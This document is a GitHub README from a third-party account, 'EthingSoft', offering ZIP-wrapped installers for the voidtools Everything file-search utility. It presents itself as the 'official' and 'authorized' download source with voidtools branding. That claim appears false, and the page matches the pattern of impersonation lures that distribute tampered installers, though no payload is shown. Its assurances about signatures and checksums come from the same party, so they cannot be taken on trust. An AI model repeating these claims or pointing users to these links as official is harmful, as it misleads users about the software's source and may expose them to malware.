<div align="center">

<img src="assets/voidtools-logo.png" alt="voidtools" width="176">

<img src="assets/everything-banner.svg" alt="Everything for Windows — stable x64 and x86 installers" width="100%">

### Official Everything installer downloads

| 🪟 Platform | 🏷️ Version | 💻 Architectures | 📦 Format |
|:---:|:---:|:---:|:---:|
| Windows | **1.4.1.1032 stable** | **x64** · **x86** | Separate ZIP archives |

<a href="https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip"><img src="assets/download-x64.svg" alt="Download Everything for Windows x64"></a>
&nbsp;
<a href="https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip"><img src="assets/download-x86.svg" alt="Download Everything for Windows x86"></a>
&nbsp;
<a href="https://github.com/EthingSoft/everything-download/releases"><img src="assets/releases.svg" alt="Browse all Everything releases"></a>

</div>

---

## 🔎 About Everything

Everything is a Windows desktop search utility focused on file and folder names. It builds an index of file names and filters results as you type, so you can locate items without manually browsing through folders.

| ✨ Feature | 📝 Details |
|---|---|
| ⚡ Instant results | Search results update as you type. |
| 📁 File and folder search | Find matching names across indexed Windows volumes. |
| 🎛️ Search filters | Refine results with Everything's search syntax. |
| 🪶 Lightweight interface | Browse results from a compact desktop search window. |

## 📦 Choose your download

| 💻 Windows architecture | 📥 Download | 📂 Archive contents |
|---|---|---|
| **64-bit (x64)** — recommended for most PCs | [Everything-1.4.1.1032-x64-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip) | x64 setup + `LICENSE.txt` |
| **32-bit (x86)** | [Everything-1.4.1.1032-x86-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip) | x86 setup + `LICENSE.txt` |

Each ZIP contains **one installer only**: choose the archive matching your Windows architecture. Beta builds and portable application packages are not included.

## 🛠️ Installation

1. Select the x64 or x86 ZIP that matches your Windows system.
2. Extract the ZIP. It contains the matching setup program and `LICENSE.txt`.
3. Run the setup program and follow the installation prompts.
4. Open Everything and enter a file or folder name to search.

## 🔐 Verify your download

SHA-256 checksums for both ZIP archives are published in [`SHA256SUMS`](https://github.com/EthingSoft/everything-download/releases/latest/download/SHA256SUMS) and attached to the [GitHub release](https://github.com/EthingSoft/everything-download/releases/latest). In PowerShell, compare a downloaded archive's hash with the corresponding value:

```powershell
Get-FileHash .\Everything-1.4.1.1032-x64-Windows.zip -Algorithm SHA256
Get-FileHash .\Everything-1.4.1.1032-x86-Windows.zip -Algorithm SHA256
```

After extraction, Windows can also verify the installer's Authenticode signature. The original installers are signed by `voidtools PTY LTD`.

## ⚖️ License and notices

Everything is copyright © 2018 David Carpenter and is distributed under the terms in [`LICENSE.txt`](LICENSE.txt). The license permits redistribution subject to retaining the copyright and permission notices. The file also includes the applicable PCRE notice. A copy of the license is included in each architecture-specific ZIP and in this repository.

The installers are original, unmodified files and retain their publisher signature. EthingSoft provides this authorized GitHub distribution; the software's original copyright and publisher notices remain with it.

## 🔗 Project links

- [Download repository and releases](https://github.com/EthingSoft/everything-download)
- [Official Everything installer page](https://EthingSoft.github.io/)
- [EthingSoft profile](https://github.com/EthingSoft)
